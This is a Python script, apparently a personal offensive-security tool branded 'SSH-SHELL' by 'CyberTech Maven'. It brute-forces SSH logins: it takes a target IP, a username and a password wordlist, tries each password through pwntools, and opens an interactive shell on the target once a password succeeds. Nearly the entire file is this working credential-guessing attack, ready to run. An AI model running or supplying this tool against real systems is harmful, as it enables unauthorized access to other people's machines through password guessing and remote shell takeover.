#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Define color variables
green = "\033[1;32m"
clear = "\033[0m"

# ASCII art banner
ascii = ">  \r\n"
ascii += "███████╗███████╗██╗  ██╗      ███████╗██╗  ██╗███████╗██╗     ██╗     	\r\n"
ascii += "██╔════╝██╔════╝██║  ██║      ██╔════╝██║  ██║██╔════╝██║     ██║     	\r\n"
ascii += "███████╗███████╗███████║█████╗███████╗███████║█████╗  ██║     ██║     	\r\n"
ascii += "╚════██║╚════██║██╔══██║╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     	\r\n"
ascii += "███████║███████║██║  ██║      ███████║██║  ██║███████╗███████╗███████╗	\r\n"
ascii += "╚══════╝╚══════╝╚═╝  ╚═╝      ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝	\r\n"
ascii += "                                                      					\r\n"
ascii += "                                                       					\r\n"
ascii += "   		={>   C Y B E R T E C H   M A V E N   <}=           			\r\n"
ascii += "                                                       					\r\n"
ascii += "         		GitHub   : Thectechmaven                      				\r\n"
ascii += "         		Medium   : @jbtechmaven                      				\r\n"
ascii += "         		Twitter  : @CyberTechMaven                   				\r\n"

# Add colors
intro = green + ascii.replace(">", "").replace("<", "") + clear

# Print the banner
print(intro)

# https://docs.pwntools.com/en/stable/tubes/ssh.html 

from pwn import *
import paramiko
import logging
import termios, sys

# Suppress unwanted logging messages from paramiko
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# Prompt the user for input values
host = str(input('Enter an IP address: '))
username = str(input('Enter a username: '))
password_list_path = str(input('Enter path to wordlist: '))
attempts = 0

print(f"[>] Attempting to connect to {host} as {username}...\n")

try:
    # Open the wordlist file and iterate through passwords
    with open(password_list_path, 'r') as password_list:
        for password in password_list:
            password = password.strip()  # Remove any trailing whitespace or newline characters
            try:
                print("[{}] Attempting password: '{}'!".format(attempts, password), end='\r')
                # Redirect stdout temporarily to suppress unwanted output
                with context.local(log_level='error'):
                    response = ssh(host=host, user=username, password=password, timeout=1)
                if response.connected():  # Ensure the session connection is verified
                    print("\n[>] Valid password found: '{}'!".format(password))
                    print(response)  # Display session details
                    # Adjust terminal settings for interactive mode
                    old_settings = termios.tcgetattr(sys.stdin)
                    try:
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, termios.tcgetattr(sys.stdin))
                        response.interactive()  # Enter interactive mode
                    finally:
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    response.close()
                    break
                response.close()
            except paramiko.ssh_exception.AuthenticationException:
                pass  # Do nothing for invalid passwords
            attempts += 1
except FileNotFoundError:
    print("[!] Wordlist file not found. Please check the file path and try again.")
except Exception as e:
    print(f"[!] An error occurred: {e}")
